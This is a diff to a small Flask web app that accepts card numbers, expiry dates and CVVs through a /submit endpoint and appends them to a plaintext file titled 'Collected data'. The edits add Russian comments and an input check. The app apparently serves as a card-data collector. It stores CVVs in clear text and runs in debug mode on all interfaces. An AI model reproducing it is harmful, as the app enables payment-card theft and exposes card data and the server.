@@ -12,9 +12,9 @@ def save_card_data(card_number, expiry_date, cvv):
 
 
 def validate_card_data(card_number, expiry_date, cvv):
-    card_ok = bool(re.fullmatch(r"\d{13,19}", card_number))
-    expiry_ok = bool(re.fullmatch(r"(0[1-9]|1[0-2])/[0-9]{2}", expiry_date))
-    cvv_ok = bool(re.fullmatch(r"\d{3,4}", cvv))
+    card_ok = bool(re.fullmatch(r"\d{13,19}", card_number))  # карта 13–19 цифр
+    expiry_ok = bool(re.fullmatch(r"(0[1-9]|1[0-2])/[0-9]{2}", expiry_date))  # MM/YY
+    cvv_ok = bool(re.fullmatch(r"\d{3,4}", cvv))  # CVV 3–4 цифры
     return card_ok and expiry_ok and cvv_ok
 
 
@@ -26,6 +26,9 @@ def index():
 @app.route("/submit", methods=["POST"])
 def submit_data():
     data = request.get_json()
+    if not data:
+        return jsonify({"message": "No JSON received"}), 400
+
     card_number = data.get("card_number")
     expiry_date = data.get("expiry_date")
     cvv = data.get("cvv")
@@ -41,8 +44,10 @@ def submit_data():
 
 
 if __name__ == "__main__":
+    # если файла ещё нет — создаём с заголовком
     if not os.path.exists(DATA_FILE):
         with open(DATA_FILE, "w", encoding="utf-8") as f:
             f.write("=== Collected data ===\n")
+
     app.run(debug=True, host="0.0.0.0", port=8000)
 
